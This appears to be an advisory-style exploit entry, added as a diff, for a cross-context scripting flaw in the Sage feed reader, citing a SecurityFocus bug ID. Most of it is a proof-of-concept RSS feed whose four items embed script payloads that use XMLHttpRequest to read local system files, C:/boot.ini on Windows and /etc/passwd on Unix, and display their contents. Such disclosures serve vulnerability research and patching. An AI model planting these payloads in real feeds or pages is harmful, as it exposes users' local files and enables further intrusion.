@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/19928/info
+
+The application is prone to an input-validation vulnerability that allows malicious HTML and script code to be injected before it is used in dynamically generated content.
+
+Attacker-supplied HTML and script code would execute in the context of the affected website, potentially allowing an attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+.
+	<rss version="2.0">
+.
+	<channel>
+<title>Cross Context Scripting with Sage</title>
+.
+	<item>
+<title>WINDOWS: works with "Allow HTML Tags" off</title>
+.
+	<content:encoded>
+<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/boot.ini"); request.send(); alert(request.responseText); } catch(e) {}</script>
+</content:encoded>
+</item>
+.
+	<item>
+<title>WINDOWS: works with "Allow HTML Tags" on</title>
+.
+	<content:encoded>
+<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///C:/boot.ini"); request.send(); alert(request.responseText); } catch(e) {}</script>
+</content:encoded>
+</item>
+.
+	<item>
+<title>UNIX: works with "Allow HTML Tags" off</title>
+.
+	<content:encoded>
+<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///etc/passwd"); request.send(); alert(request.responseText); } catch(e) {}</script>
+</content:encoded>
+</item>
+.
+	<item>
+<title>UNIX: works with "Allow HTML Tags" on</title>
+.
+	<content:encoded>
+<script>try { request = new XMLHttpRequest(); request.open("GET", "file:///etc/passwd"); request.send(); alert(request.responseText); } catch(e) {}</script>
+</content:encoded>
+</item>
+</channel>
+</rss>
